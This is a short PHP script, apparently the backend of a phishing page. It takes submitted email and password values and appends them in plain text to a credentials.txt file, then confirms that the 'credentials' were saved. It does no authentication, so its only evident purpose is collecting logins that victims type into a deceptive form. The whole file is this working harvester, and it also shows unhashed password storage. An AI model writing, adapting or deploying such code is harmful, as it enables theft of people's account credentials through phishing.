<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    if (!empty($email) && !empty($password)) {
        $data = "Email: $email\nPassword: $password\n\n";
        
        $file = fopen("credentials.txt", "a");
        if ($file) {
            fwrite($file, $data);
            fclose($file);
            echo "Credentials saved successfully.";
        } else {
            echo "Error saving credentials.";
        }
    } else {
        echo "Please fill in all fields.";
    }
} else {
    echo "Invalid request.";
}
?>
